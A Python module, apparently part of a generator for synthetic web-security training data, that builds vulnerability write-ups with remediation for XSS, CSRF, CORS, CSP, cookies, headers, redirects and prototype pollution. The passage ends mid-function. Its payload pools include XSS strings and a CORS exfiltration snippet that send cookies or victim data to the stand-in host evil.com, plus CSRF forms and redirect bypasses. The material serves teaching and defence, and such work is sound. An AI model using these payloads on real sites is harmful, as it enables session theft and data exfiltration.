"""
Web Application Security generator.
Produces OWASP Top 10 analysis, XSS, CSRF, CORS, CSP, cookie security,
clickjacking, open redirect, web cache poisoning, and prototype pollution entries.
Target: 8000 entries.
"""

import random
from typing import List, Dict, Any
from ..templates import (
    CategoryGenerator, pick_complexity, pick_severity, format_entry,
    rand_ip, rand_domain, rand_port, rand_var_name, rand_func_name,
    rand_table_name, rand_path,
)
from ..knowledge_base import (
    CWE_DB, OWASP_TOP10, MITRE_ATTACK, APP_CONTEXTS, PRODUCTS,
    CLOUD_SERVICES, FRAMEWORKS, PROTOCOLS,
)


# ── Instruction pools ──────────────────────────────────────────────────────

WEB_INSTRUCTIONS = [
    "Analyze the following web application scenario for security vulnerabilities. Identify the issue, explain the risk, and provide remediation guidance.",
    "Review this web application configuration and identify any security weaknesses. Explain how they could be exploited and recommend fixes.",
    "As a web security analyst, evaluate the following scenario. Identify OWASP Top 10 violations and provide a detailed security assessment.",
    "Examine this HTTP interaction for security issues. Describe the vulnerability class, potential impact, and defense mechanisms.",
    "Assess the following web security scenario. Classify the vulnerability, explain the attack vector, and recommend both immediate and long-term fixes.",
    "Perform a security review of this web application behavior. Identify the vulnerability, map it to relevant CWE/OWASP categories, and provide secure alternatives.",
    "Analyze the following client-side security issue. Explain how it can be exploited, what data is at risk, and how to implement proper defenses.",
    "Evaluate this web application for common security anti-patterns. Provide a risk assessment with CVSS-style severity and actionable remediation steps.",
    "Review the following web request/response for security concerns. Identify headers, cookies, or code patterns that introduce risk.",
    "As a penetration tester, analyze this web application scenario. Describe the finding, its exploitability, business impact, and recommended controls.",
    "Conduct a security assessment of this web application feature. Identify the vulnerability type, affected components, and provide a defense-in-depth strategy.",
    "Analyze this web application code/configuration for OWASP Top 10 compliance. List all findings with severity ratings and remediation priorities.",
    "Review this web application's security posture based on the following scenario. Provide findings mapped to CWE identifiers with fix recommendations.",
    "Evaluate the following browser-side security mechanism for effectiveness. Identify bypasses or misconfigurations and recommend improvements.",
    "Assess this web application endpoint for input validation, output encoding, and access control weaknesses. Provide a structured security report.",
    "Examine the following web application scenario for injection, authentication, or access control flaws. Provide a detailed vulnerability write-up.",
]

# ── Scenario type definitions ──────────────────────────────────────────────

SCENARIO_TYPES = [
    "xss_reflected", "xss_stored", "xss_dom", "csrf", "clickjacking",
    "cors_misconfig", "cookie_security", "csp_bypass", "http_header",
    "open_redirect", "cache_poisoning", "prototype_pollution",
]

# ── XSS templates ──────────────────────────────────────────────────────────

XSS_CONTEXTS = [
    ("HTML body", '<div class="profile-bio">{user_input}</div>'),
    ("HTML attribute", '<img src="avatar.png" alt="{user_input}">'),
    ("JavaScript string", 'var greeting = "{user_input}";'),
    ("URL parameter", '<a href="/search?q={user_input}">Results</a>'),
    ("Event handler", '<button onclick="doAction(\'{user_input}\')">Go</button>'),
    ("CSS value", '<div style="background: {user_input};">content</div>'),
    ("JSON response", '{{"name": "{user_input}", "role": "user"}}'),
    ("Template literal", 'const msg = `Welcome, ${{"{user_input}"}}`'),
    ("SVG context", '<svg><text>{user_input}</text></svg>'),
    ("iframe src", '<iframe src="{user_input}"></iframe>'),
]

XSS_PAYLOADS = [
    '<script>document.location="https://evil.com/?c="+document.cookie</script>',
    '"><img src=x onerror=alert(document.domain)>',
    "';fetch('https://evil.com/steal?d='+document.cookie)//",
    'javascript:alert(document.cookie)',
    '<svg/onload=fetch(`https://evil.com/${document.cookie}`)>',
    '{{constructor.constructor("return this")().alert(1)}}',
    '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
    '"-prompt(1)-"',
    '<details/open/ontoggle=alert(1)>',
    '<math><maction actiontype="statusline">xss</maction></math>',
]

# ── CSRF templates ─────────────────────────────────────────────────────────

CSRF_ACTIONS = [
    ("password change", "/api/account/password", "POST", "new_password=hacked123"),
    ("email update", "/api/account/email", "PUT", "email=attacker@evil.com"),
    ("fund transfer", "/api/transfer", "POST", "to=attacker_acct&amount=10000"),
    ("admin role grant", "/api/admin/roles", "POST", "user_id=456&role=admin"),
    ("delete account", "/api/account/delete", "DELETE", "confirm=true"),
    ("API key generation", "/api/keys/generate", "POST", "scope=full_access"),
    ("webhook registration", "/api/webhooks", "POST", "url=https://evil.com/hook"),
    ("MFA disable", "/api/account/mfa", "DELETE", "disable=true"),
]

CSRF_DEFENSES_MISSING = [
    "No CSRF token in the form",
    "CSRF token present but not validated server-side",
    "SameSite cookie attribute not set",
    "Token bound to session but session is predictable",
    "GET request used for state-changing operation",
    "CORS policy allows wildcard origins with credentials",
]

# ── CORS misconfig templates ──────────────────────────────────────────────

CORS_CONFIGS = [
    {"origin_header": "Access-Control-Allow-Origin: *",
     "creds_header": "Access-Control-Allow-Credentials: true",
     "issue": "wildcard_with_creds"},
    {"origin_header": "Access-Control-Allow-Origin: {reflected_origin}",
     "creds_header": "Access-Control-Allow-Credentials: true",
     "issue": "reflected_origin"},
    {"origin_header": "Access-Control-Allow-Origin: null",
     "creds_header": "Access-Control-Allow-Credentials: true",
     "issue": "null_origin"},
    {"origin_header": "Access-Control-Allow-Origin: https://evil.com",
     "creds_header": "Access-Control-Allow-Credentials: true",
     "issue": "untrusted_origin"},
    {"origin_header": "Access-Control-Allow-Origin: *",
     "creds_header": "",
     "issue": "overly_permissive"},
]

# ── Cookie security templates ─────────────────────────────────────────────

COOKIE_ISSUES = [
    {"name": "session_id", "value": "abc123def456", "flags": "",
     "issue": "Missing Secure, HttpOnly, and SameSite flags"},
    {"name": "auth_token", "value": "eyJhbGci...", "flags": "Secure",
     "issue": "Missing HttpOnly flag exposes JWT to XSS"},
    {"name": "user_prefs", "value": '{"role":"admin"}', "flags": "HttpOnly",
     "issue": "Sensitive role data in cookie without Secure flag"},
    {"name": "JSESSIONID", "value": "AAABBB111222", "flags": "HttpOnly; Secure",
     "issue": "Missing SameSite attribute allows CSRF"},
    {"name": "remember_me", "value": "user:admin:hash_weak", "flags": "",
     "issue": "Predictable remember-me token with weak hash"},
    {"name": "csrf_token", "value": "static_token_123", "flags": "",
     "issue": "Static CSRF token not rotated per session"},
    {"name": "session", "value": "base64encoded", "flags": "SameSite=None",
     "issue": "SameSite=None without Secure flag"},
]

# ── CSP templates ─────────────────────────────────────────────────────────

CSP_POLICIES = [
    ("default-src 'self' 'unsafe-inline' 'unsafe-eval'",
     "unsafe-inline and unsafe-eval defeat the purpose of CSP"),
    ("default-src *; script-src *",
     "Wildcard sources allow loading scripts from any origin"),
    ("default-src 'self'; script-src 'self' https://cdn.jsdelivr.net 'unsafe-inline'",
     "unsafe-inline combined with CDN allows script injection via hosted files"),
    ("default-src 'self'; script-src 'nonce-abc123'",
     "Static nonce reused across requests is predictable"),
    ("default-src 'none'",
     "Overly restrictive policy will break functionality without proper fallbacks"),
    ("script-src 'self' 'unsafe-eval'; object-src 'self'; base-uri *",
     "Unrestricted base-uri allows base tag injection"),
    ("default-src 'self'; script-src https: 'unsafe-inline'",
     "https: scheme allows scripts from any HTTPS origin"),
    ("default-src 'self'; script-src 'self'; frame-ancestors 'none'; report-uri /csp-report",
     "Good policy but using deprecated report-uri instead of report-to"),
]

# ── HTTP header security templates ────────────────────────────────────────

HEADER_SCENARIOS = [
    {"headers": {"X-Frame-Options": "MISSING", "Content-Security-Policy": "MISSING"},
     "issue": "clickjacking", "missing": ["X-Frame-Options", "frame-ancestors CSP"]},
    {"headers": {"Strict-Transport-Security": "MISSING"},
     "issue": "ssl_stripping", "missing": ["HSTS header"]},
    {"headers": {"X-Content-Type-Options": "MISSING"},
     "issue": "mime_sniffing", "missing": ["X-Content-Type-Options: nosniff"]},
    {"headers": {"Referrer-Policy": "MISSING"},
     "issue": "referrer_leak", "missing": ["Referrer-Policy header"]},
    {"headers": {"Permissions-Policy": "MISSING"},
     "issue": "feature_abuse", "missing": ["Permissions-Policy header"]},
    {"headers": {"X-Content-Type-Options": "nosniff", "X-Frame-Options": "DENY",
                 "Strict-Transport-Security": "max-age=300"},
     "issue": "weak_hsts", "missing": ["HSTS max-age too short (should be >= 31536000)"]},
    {"headers": {"Server": "Apache/2.4.49", "X-Powered-By": "PHP/7.4.3"},
     "issue": "info_disclosure", "missing": ["Remove Server and X-Powered-By headers"]},
]

# ── Open redirect templates ───────────────────────────────────────────────

REDIRECT_PATTERNS = [
    ("/login?redirect={url}", "Query parameter redirect"),
    ("/auth/callback?next={url}", "OAuth callback redirect"),
    ("/logout?return_to={url}", "Post-logout redirect"),
    ("/sso/redirect?target={url}", "SSO target parameter"),
    ("/api/short/{url}", "URL shortener redirect"),
    ("/go?url={url}", "Generic redirect handler"),
    ("/link?dest={url}", "Link tracking redirect"),
]

REDIRECT_BYPASSES = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https://legitimate.com@evil.com",
    "https://legitimate.com.evil.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "https://evil.com/%2F%2Flegitimate.com",
]

# ── Cache poisoning templates ─────────────────────────────────────────────

CACHE_POISON_VECTORS = [
    {"header": "X-Forwarded-Host", "value": "evil.com",
     "effect": "Cached page serves links pointing to attacker domain"},
    {"header": "X-Forwarded-Scheme", "value": "nothttps",
     "effect": "Cached page forces redirect to attacker-controlled scheme"},
    {"header": "X-Original-URL", "value": "/admin/dashboard",
     "effect": "Cache serves admin page to unauthenticated users"},
    {"header": "X-Forwarded-Port", "value": "1234",
     "effect": "Cached redirect URLs contain unexpected port"},
    {"header": "Transfer-Encoding", "value": "chunked, identity",
     "effect": "Request smuggling via ambiguous Transfer-Encoding"},
    {"header": "X-Rewrite-URL", "value": "/sensitive-endpoint",
     "effect": "Cache key mismatch serves wrong content"},
]

# ── Prototype pollution templates ─────────────────────────────────────────

PROTO_POLLUTION_SINKS = [
    {"code": "function merge(target, source) {\n  for (let key in source) {\n    if (typeof source[key] === 'object') {\n      target[key] = merge(target[key] || {}, source[key]);\n    } else {\n      target[key] = source[key];\n    }\n  }\n  return target;\n}",
     "payload": '{"__proto__": {"isAdmin": true}}',
     "impact": "Property injection via __proto__ pollutes Object.prototype"},
    {"code": "const config = {};\nObject.assign(config, JSON.parse(userInput));",
     "payload": '{"constructor": {"prototype": {"polluted": true}}}',
     "impact": "constructor.prototype pollution via Object.assign"},
    {"code": "_.merge({}, userControlledObject);",
     "payload": '{"__proto__": {"shell": "/bin/sh"}}',
     "impact": "Lodash merge allows prototype pollution leading to RCE in child_process"},
    {"code": "const qs = require('qs');\nconst params = qs.parse(req.query);",
     "payload": "?__proto__[admin]=1",
     "impact": "Query string parsing pollutes prototype with admin flag"},
    {"code": "function set(obj, path, value) {\n  const keys = path.split('.');\n  let current = obj;\n  for (let i = 0; i < keys.length - 1; i++) {\n    current = current[keys[i]] = current[keys[i]] || {};\n  }\n  current[keys[keys.length-1]] = value;\n}",
     "payload": "set({}, '__proto__.polluted', true)",
     "impact": "Path traversal into __proto__ via dot notation"},
]

# ── Clickjacking templates ────────────────────────────────────────────────

CLICKJACK_TARGETS = [
    ("account deletion page", "/account/delete", "User unknowingly clicks delete"),
    ("password change form", "/settings/password", "User submits attacker's password"),
    ("payment confirmation", "/checkout/confirm", "User authorizes fraudulent payment"),
    ("privacy settings toggle", "/settings/privacy", "User disables security features"),
    ("OAuth authorization", "/oauth/authorize", "User grants attacker app access"),
    ("admin panel action", "/admin/action", "Admin performs unauthorized action"),
    ("2FA disable button", "/security/2fa/disable", "User disables two-factor auth"),
]


# ── Entry generators ──────────────────────────────────────────────────────

def _gen_xss(rng, complexity, idx, prefix):
    context_name, context_template = rng.choice(XSS_CONTEXTS)
    payload = rng.choice(XSS_PAYLOADS)
    app = rng.choice(APP_CONTEXTS)
    domain = rand_domain(rng)
    param = rng.choice(["search", "q", "name", "comment", "bio", "title", "msg", "redirect", "callback"])
    xss_type = rng.choice(["Reflected", "Stored", "DOM-based"])

    input_text = f"**Application:** {app} at https://{domain}\n"
    input_text += f"**Endpoint:** {rand_path(rng)}\n"
    input_text += f"**XSS Type:** {xss_type}\n"
    input_text += f"**Injection Context:** {context_name}\n\n"
    input_text += f"The application renders user-supplied parameter `{param}` in the following context:\n"
    input_text += f"```html\n{context_template.format(user_input='{{USER_INPUT}}')}\n```\n\n"
    input_text += f"No input sanitization or output encoding is applied before rendering."

    severity = pick_severity(rng, complexity)
    cwe = "CWE-79"

    output = f"## XSS Vulnerability Analysis\n\n"
    output += f"**Type:** {xss_type} Cross-Site Scripting\n"
    output += f"**CWE:** CWE-79 (Cross-site Scripting)\n"
    output += f"**OWASP:** A03:2021 - Injection\n"
    output += f"**Severity:** {severity.upper()}\n"
    output += f"**Context:** {context_name}\n\n"

    output += "### Vulnerability Description\n"
    output += f"The {app} at `{domain}` is vulnerable to {xss_type} XSS in the `{param}` parameter. "
    output += f"User input is inserted directly into a {context_name} context without proper encoding or sanitization.\n\n"

    output += "### Proof of Concept\n"
    output += f"An attacker can inject the following payload via the `{param}` parameter:\n"
    output += f"```\n{payload}\n```\n\n"
    output += f"This would render as:\n"
    output += f"```html\n{context_template.format(user_input=payload)}\n```\n\n"

    output += "### Impact\n"
    if xss_type == "Stored":
        output += "- **Session Hijacking:** Attacker steals session cookies from every user viewing the affected page\n"
        output += "- **Persistent Defacement:** Malicious content is stored and served to all visitors\n"
        output += "- **Credential Theft:** Fake login forms can be injected to phish users\n"
        output += "- **Worm Propagation:** Stored XSS can self-replicate by posting on behalf of victims\n\n"
    elif xss_type == "Reflected":
        output += "- **Session Hijacking:** Attacker steals the victim's session cookie via crafted link\n"
        output += "- **Phishing:** Reflected content appears to come from the trusted domain\n"
        output += "- **Drive-by Downloads:** Malicious scripts can redirect users to exploit kits\n\n"
    else:
        output += "- **DOM Manipulation:** Attacker modifies page content via client-side script injection\n"
        output += "- **Session Theft:** Document.cookie access allows session hijacking\n"
        output += "- **Keylogging:** Injected scripts can capture user keystrokes\n\n"

    output += "### Remediation\n"
    output += f"1. **Context-Aware Output Encoding:** Apply {_encoding_for_context(context_name)} encoding for the {context_name} context\n"
    output += "2. **Content Security Policy:** Deploy a strict CSP with nonce-based script execution\n"
    output += "   ```\n   Content-Security-Policy: default-src 'self'; script-src 'nonce-{random}';\n   ```\n"
    output += "3. **Input Validation:** Validate and sanitize input using an allowlist approach\n"
    output += "4. **HttpOnly Cookies:** Set HttpOnly flag on session cookies to prevent JavaScript access\n"
    output += "5. **Use Security Libraries:** Employ frameworks with auto-escaping (React, Angular, Django templates)\n\n"

    if complexity in ("advanced", "expert"):
        output += "### Defense-in-Depth Layers\n"
        output += "- Implement Trusted Types API to prevent DOM XSS sinks\n"
        output += "- Deploy Subresource Integrity (SRI) for third-party scripts\n"
        output += "- Use `X-Content-Type-Options: nosniff` to prevent MIME type sniffing\n"
        output += "- Implement DOMPurify or similar library for user-generated HTML content\n"
        output += "- Enable CSP reporting to monitor policy violations\n"

    return format_entry(
        entry_id=f"{prefix}-{idx:05d}",
        title=f"{xss_type} XSS in {context_name} Context - {app}",
        severity=severity, cwe=cwe,
        instruction=rng.choice(WEB_INSTRUCTIONS),
        input_text=input_text, output_text=output,
    )


def _gen_csrf(rng, complexity, idx, prefix):
    action_name, endpoint, method, params = rng.choice(CSRF_ACTIONS)
    app = rng.choice(APP_CONTEXTS)
    domain = rand_domain(rng)
    defense_gap = rng.choice(CSRF_DEFENSES_MISSING)

    input_text = f"**Application:** {app} at https://{domain}\n"
    input_text += f"**Endpoint:** {endpoint}\n"
    input_text += f"**Method:** {method}\n"
    input_text += f"**Action:** {action_name}\n\n"
    input_text += f"The endpoint performs a state-changing operation ({action_name}) with the following parameters:\n"
    input_text += f"```\n{params}\n```\n\n"
    input_text += f"Observation: {defense_gap}.\n"
    input_text += f"The session cookie is: `Set-Cookie: session=abc123; HttpOnly; Secure`"

    severity = pick_severity(rng, complexity)

    output = f"## CSRF Vulnerability Analysis\n\n"
    output += f"**CWE:** CWE-352 (Cross-Site Request Forgery)\n"
    output += f"**OWASP:** A01:2021 - Broken Access Control\n"
    output += f"**Severity:** {severity.upper()}\n"
    output += f"**Affected Action:** {action_name}\n\n"

    output += "### Vulnerability Description\n"
    output += f"The `{endpoint}` endpoint in the {app} is vulnerable to Cross-Site Request Forgery. "
    output += f"{defense_gap}. An attacker can craft a malicious page that automatically submits "
    output += f"a {method} request to perform a {action_name} on behalf of an authenticated victim.\n\n"

    output += "### Attack Scenario\n"
    output += f"1. Victim authenticates to `https://{domain}` and receives a session cookie\n"
    output += f"2. Victim visits attacker's page at `https://evil.com/exploit.html`\n"
    output += f"3. Attacker's page contains a hidden form/script that submits to `{endpoint}`\n"
    output += f"4. Browser automatically includes the session cookie with the request\n"
    output += f"5. Server processes the {action_name} as if the victim initiated it\n\n"

    output += "### Proof of Concept\n"
    if method in ("POST", "PUT"):
        output += f'```html\n<form action="https://{domain}{endpoint}" method="POST" id="csrf-form">\n'
        for p in params.split("&"):
            k, v = p.split("=", 1)
            output += f'  <input type="hidden" name="{k}" value="{v}" />\n'
        output += '</form>\n<script>document.getElementById("csrf-form").submit();</script>\n```\n\n'
    else:
        output += f'```html\n<img src="https://{domain}{endpoint}?{params}" style="display:none" />\n```\n\n'

    output += "### Remediation\n"
    output += "1. **Synchronizer Token Pattern:** Generate a unique, unpredictable CSRF token per session and validate it server-side\n"
    output += "2. **SameSite Cookie Attribute:** Set `SameSite=Strict` or `SameSite=Lax` on session cookies\n"
    output += "   ```\n   Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict\n   ```\n"
    output += "3. **Double Submit Cookie:** Send CSRF token in both cookie and request body/header\n"
    output += f"4. **Verify Request Method:** Ensure state-changing operations reject GET requests\n"
    output += "5. **Custom Request Header:** Require a custom header (e.g., `X-Requested-With`) that cannot be set cross-origin\n"
    output += "6. **Origin/Referer Validation:** Check the Origin and Referer headers against expected values\n\n"

    return format_entry(
        entry_id=f"{prefix}-{idx:05d}",
        title=f"CSRF: Unprotected {action_name} - {app}",
        severity=severity, cwe="CWE-352",
        instruction=rng.choice(WEB_INSTRUCTIONS),
        input_text=input_text, output_text=output,
    )


def _gen_clickjacking(rng, complexity, idx, prefix):
    target_name, target_path, impact = rng.choice(CLICKJACK_TARGETS)
    app = rng.choice(APP_CONTEXTS)
    domain = rand_domain(rng)

    input_text = f"**Application:** {app} at https://{domain}\n"
    input_text += f"**Target Page:** {target_path}\n"
    input_text += f"**Sensitive Action:** {target_name}\n\n"
    input_text += "The application's HTTP response headers are:\n```\n"
    input_text += "HTTP/1.1 200 OK\n"
    input_text += "Content-Type: text/html\n"
    input_text += f"Server: nginx\n"
    input_text += "```\n\n"
    input_text += "No `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` header is present."

    severity = pick_severity(rng, complexity)

    output = f"## Clickjacking Vulnerability Analysis\n\n"
    output += f"**CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers / Clickjacking)\n"
    output += f"**OWASP:** A01:2021 - Broken Access Control\n"
    output += f"**Severity:** {severity.upper()}\n\n"

    output += "### Vulnerability Description\n"
    output += f"The {target_name} page at `{domain}{target_path}` can be embedded in an iframe "
    output += f"by an attacker-controlled page. This allows UI redressing attacks where the attacker "
    output += f"overlays invisible frames to trick users into performing unintended actions.\n\n"

    output += "### Attack Scenario\n"
    output += f"1. Attacker creates a page that iframes `https://{domain}{target_path}`\n"
    output += f"2. The iframe is made transparent (`opacity: 0`) and positioned over a decoy button\n"
    output += f"3. Victim sees the decoy (e.g., 'Click to win a prize') and clicks\n"
    output += f"4. The click is actually on the `{target_name}` button in the invisible iframe\n"
    output += f"5. Result: {impact}\n\n"

    output += "### Proof of Concept\n"
    output += f'```html\n<style>\n  iframe {{\n    position: absolute;\n    top: 0; left: 0;\n    width: 500px; height: 400px;\n    opacity: 0.0001;\n    z-index: 2;\n  }}\n  .decoy {{\n    position: absolute;\n    top: 180px; left: 100px;\n    z-index: 1;\n  }}\n</style>\n<div class="decoy"><button>Click Here to Claim Prize!</button></div>\n<iframe src="https://{domain}{target_path}"></iframe>\n```\n\n'

    output += "### Remediation\n"
    output += "1. **X-Frame-Options Header:** Set `X-Frame-Options: DENY` or `SAMEORIGIN`\n"
    output += "   ```\n   X-Frame-Options: DENY\n   ```\n"
    output += "2. **CSP frame-ancestors:** Use the more flexible CSP directive\n"
    output += "   ```\n   Content-Security-Policy: frame-ancestors 'none';\n   ```\n"
    output += "3. **JavaScript Frame-busting:** Add client-side defense (not sufficient alone)\n"
    output += "   ```javascript\n   if (window.top !== window.self) { window.top.location = window.self.location; }\n   ```\n"
    output += "4. **SameSite Cookies:** Use `SameSite=Strict` to prevent cookie inclusion in iframes\n"
    output += "5. **Confirmation Dialogs:** Require re-authentication for critical actions\n\n"

    return format_entry(
        entry_id=f"{prefix}-{idx:05d}",
        title=f"Clickjacking: {target_name} - {app}",
        severity=severity, cwe="CWE-1021",
        instruction=rng.choice(WEB_INSTRUCTIONS),
        input_text=input_text, output_text=output,
    )


def _gen_cors(rng, complexity, idx, prefix):
    config = rng.choice(CORS_CONFIGS)
    app = rng.choice(APP_CONTEXTS)
    domain = rand_domain(rng)
    api_path = rng.choice(["/api/user/profile", "/api/account/data", "/api/transactions",
                           "/api/admin/settings", "/api/internal/config", "/api/user/tokens"])

    reflected = rand_domain(rng) if config["issue"] == "reflected_origin" else ""
    origin_hdr = config["origin_header"].format(reflected_origin=f"https://{reflected}" if reflected else "")

    input_text = f"**Application:** {app} at https://{domain}\n"
    input_text += f"**API Endpoint:** {api_path}\n\n"
    input_text += f"Request:\n```\nGET {api_path} HTTP/1.1\nHost: {domain}\n"
    input_text += f"Origin: https://evil.com\nCookie: session=valid_token\n```\n\n"
    input_text += f"Response:\n```\nHTTP/1.1 200 OK\n{origin_hdr}\n"
    if config["creds_header"]:
        input_text += f"{config['creds_header']}\n"
    input_text += f"Content-Type: application/json\n```"

    severity = pick_severity(rng, complexity)

    output = f"## CORS Misconfiguration Analysis\n\n"
    output += f"**CWE:** CWE-942 (Overly Permissive CORS Policy)\n"
    output += f"**OWASP:** A01:2021 - Broken Access Control\n"
    output += f"**Severity:** {severity.upper()}\n"
    output += f"**Issue Type:** {config['issue'].replace('_', ' ').title()}\n\n"

    output += "### Vulnerability Description\n"
    issue_desc = {
        "wildcard_with_creds": "The API returns `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`. While browsers block this combination, misconfigured proxies or older browsers may not enforce this correctly.",
        "reflected_origin": f"The API reflects the requesting Origin header in the `Access-Control-Allow-Origin` response. Any origin including attacker-controlled domains can make authenticated cross-origin requests.",
        "null_origin": "The API allows the `null` origin with credentials. Sandboxed iframes, `data:` URLs, and local files all send `Origin: null`, enabling cross-origin data theft.",
        "untrusted_origin": "The API explicitly trusts an untrusted external origin, allowing that domain to make authenticated requests to sensitive endpoints.",
        "overly_permissive": "The wildcard `*` origin allows any website to read the API response, though credentials are not included.",
    }
    output += f"{issue_desc.get(config['issue'], 'Misconfigured CORS policy.')} "
    output += f"This affects the `{api_path}` endpoint on `{domain}`.\n\n"

    output += "### Attack Scenario\n"
    output += f"```javascript\n// Attacker hosts this on evil.com\nfetch('https://{domain}{api_path}', {{\n  credentials: 'include'\n}}).then(r => r.json()).then(data => {{\n  // Exfiltrate victim's data\n  fetch('https://evil.com/collect', {{\n    method: 'POST',\n    body: JSON.stringify(data)\n  }});\n}});\n```\n\n"

    output += "### Remediation\n"
    output += "1. **Explicit Origin Allowlist:** Only allow specific trusted origins\n"
    output += "   ```python\n   ALLOWED_ORIGINS = ['https://app.example.com', 'https://admin.example.com']\n   if request.origin in ALLOWED_ORIGINS:\n       response['Access-Control-Allow-Origin'] = request.origin\n   ```\n"
    output += "2. **Avoid Reflecting Origins:** Never dynamically reflect the Origin header without validation\n"
    output += "3. **Restrict Credentials:** Only set `Access-Control-Allow-Credentials: true` when necessary\n"
    output += "4. **Limit Exposed Headers:** Use `Access-Control-Expose-Headers` to restrict accessible response headers\n"
    output += "5. **Preflight Validation:** Ensure OPTIONS preflight requests are properly validated\n\n"

    return format_entry(
        entry_id=f"{prefix}-{idx:05d}",
        title=f"CORS Misconfiguration: {config['issue'].replace('_', ' ').title()} - {app}",
        severity=severity, cwe="CWE-942",
        instruction=rng.choice(WEB_INSTRUCTIONS),
        input_text=input_text, output_text=output,
    )


def _gen_cookie(rng, complexity, idx, prefix):
    cookie = rng.choice(COOKIE_ISSUES)
    app = rng.choice(APP_CONTEXTS)
    domain = rand_domain(rng)

    input_text = f"**Application:** {app} at https://{domain}\n\n"
    input_text += f"Observed Set-Cookie header:\n```\n"
    input_text += f"Set-Cookie: {cookie['name']}={cookie['value']}"
    if cookie["flags"]:
        input_text += f"; {cookie['flags']}"
    input_text += f"; Path=/\n```"

    severity = pick_severity(rng, complexity)

    output = f"## Cookie Security Analysis\n\n"
    output += f"**CWE:** CWE-614 (Sensitive Cookie Without Secure Flag) / CWE-1004 (Sensitive Cookie Without HttpOnly)\n"
    output += f"**OWASP:** A02:2021 - Cryptographic Failures\n"
    output += f"**Severity:** {severity.upper()}\n\n"

    output += "### Finding\n"
    output += f"The `{cookie['name']}` cookie in the {app} has the following security issue: **{cookie['issue']}**.\n\n"

    output += "### Current Cookie Configuration\n"
    output += f"```\n{cookie['name']}={cookie['value']}"
    if cookie["flags"]:
        output += f"; {cookie['flags']}"
    output += "; Path=/\n```\n\n"

    output += "### Risk Assessment\n"
    output += f"- **Without `Secure`:** Cookie transmitted over HTTP, vulnerable to network sniffing and MITM\n"
    output += f"- **Without `HttpOnly`:** Cookie accessible to JavaScript, vulnerable to XSS-based theft\n"
    output += f"- **Without `SameSite`:** Cookie sent with cross-origin requests, enabling CSRF attacks\n"
    output += f"- **Predictable Value:** Weak or predictable tokens can be brute-forced or guessed\n\n"

    output += "### Recommended Configuration\n"
    output += f"```\nSet-Cookie: {cookie['name']}=<cryptographically-random-value>; "
    output += "Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600\n```\n\n"

    output += "### Remediation Steps\n"
    output += "1. Add `Secure` flag to ensure transmission only over HTTPS\n"
    output += "2. Add `HttpOnly` flag to prevent JavaScript access (for session/auth cookies)\n"
    output += "3. Set `SameSite=Strict` or `SameSite=Lax` to mitigate CSRF\n"
    output += "4. Use cryptographically random values with sufficient entropy (128+ bits)\n"
    output += "5. Set appropriate `Max-Age` or `Expires` to limit cookie lifetime\n"
    output += "6. Scope cookies with `Path` and `Domain` attributes\n"

    return format_entry(
        entry_id=f"{prefix}-{idx:05d}",
        title=f"Cookie Security: {cookie['issue'][:50]} - {app}",
        severity=severity, cwe="CWE-614",
        instruction=rng.choice(WEB_INSTRUCTIONS),
        input_text=input_text, output_text=output,
    )


def _gen_csp(rng, complexity, idx, prefix):
    policy, issue = rng.choice(CSP_POLICIES)
    app = rng.choice(APP_CONTEXTS)
    domain = rand_domain(rng)

    input_text = f"**Application:** {app} at https://{domain}\n\n"
    input_text += f"Content-Security-Policy header:\n```\n{policy}\n```"

    severity = pick_severity(rng, complexity)

    output = f"## CSP Analysis\n\n"
    output += f"**CWE:** CWE-79 (XSS via CSP bypass)\n"
    output += f"**OWASP:** A05:2021 - Security Misconfiguration\n"
    output += f"**Severity:** {severity.upper()}\n\n"

    output += "### Policy Review\n"
    output += f"```\n{policy}\n```\n\n"

    output += f"### Issue\n{issue}\n\n"

    output += "### Directive Analysis\n"
    for directive in policy.split(";"):
        directive = directive.strip()
        if directive:
            output += f"- `{directive}`: {_analyze_csp_directive(directive)}\n"
    output += "\n"

    output += "### Recommended Policy\n"
    output += "```\nContent-Security-Policy:\n"
    output += "  default-src 'none';\n"
    output += "  script-src 'nonce-{random}' 'strict-dynamic';\n"
    output += "  style-src 'self' 'nonce-{random}';\n"
    output += "  img-src 'self' data:;\n"
    output += "  font-src 'self';\n"
    output += "  connect-src 'self';\n"
    output += "  frame-ancestors 'none';\n"
    output += "  base-uri 'self';\n"
    output += "  form-action 'self';\n"
    output += "  report-to csp-endpoint;\n```\n\n"

    output += "### Migration Steps\n"
    output += "1. Audit all inline scripts and move them to external files with nonces\n"
    output += "2. Remove `'unsafe-inline'` and `'unsafe-eval'` directives\n"
    output += "3. Replace wildcard sources with specific domain allowlists\n"
    output += "4. Deploy in report-only mode first to identify breakage\n"
    output += "5. Enable `report-to` for ongoing violation monitoring\n"

    return format_entry(
        entry_id=f"{prefix}-{idx:05d}",
        title=f"CSP Weakness: {issue[:50]} - {app}",
        severity=severity, cwe="CWE-79",
        instruction=rng.choice(WEB_INSTRUCTIONS),
        input_text=input_text, output_text=output,
    )


def _gen_headers(rng, complexity, idx, prefix):
    scenario = rng.choice(HEADER_SCENARIOS)
    app = rng.choice(APP_CONTEXTS)
    domain = rand_domain(rng)

    input_text = f"**Application:** {app} at https://{domain}\n\n"
    input_text += "HTTP Response Headers:\n```\nHTTP/1.1 200 OK\n"
    for h, v in scenario["headers"].items():
        if v != "MISSING":
            input_text += f"{h}: {v}\n"
    input_text += "Content-Type: text/html; charset=utf-8\n```\n\n"
    input_text += f"Missing headers: {', '.join(scenario['missing'])}"

    severity = pick_severity(rng, complexity)

    output = f"## HTTP Security Headers Analysis\n\n"
    output += f"**Issue:** {scenario['issue'].replace('_', ' ').title()}\n"
    output += f"**Severity:** {severity.upper()}\n"
    output += f"**OWASP:** A05:2021 - Security Misconfiguration\n\n"

    output += "### Missing/Misconfigured Headers\n"
    for m in scenario["missing"]:
        output += f"- {m}\n"
    output += "\n"

    output += "### Risk\n"
    risks = {
        "clickjacking": "Without X-Frame-Options or frame-ancestors CSP, the page can be embedded in attacker-controlled iframes for UI redressing attacks.",
        "ssl_stripping": "Without HSTS, users connecting via HTTP can be intercepted before HTTPS redirect, enabling SSL stripping (MITM) attacks.",
        "mime_sniffing": "Without X-Content-Type-Options, browsers may MIME-sniff responses and execute uploaded files as scripts.",
